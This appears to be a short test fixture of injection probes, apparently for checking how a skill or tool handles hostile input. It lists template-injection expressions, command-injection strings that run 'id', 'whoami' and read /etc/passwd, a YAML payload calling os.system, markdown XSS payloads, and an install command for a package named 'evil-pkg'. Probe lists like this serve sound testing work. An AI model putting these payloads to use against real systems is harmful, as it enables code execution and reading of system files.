# bb-skill-ctrl

SSTI: {{7*7}} | ${7*7} | <%= 7*7 %> | #{7*7} | {% debug %} | {{ config.__class__ }} | {{ self }}

CMD: `id` | $(whoami) | ; cat /etc/passwd

YAML: ---
&anchor *alias
!!python/object/apply:os.system ["id"]

MD: [click](javascript:alert(1)) ![img](x onerror=alert(1))

installCommand: npx evil-pkg@1.0.0
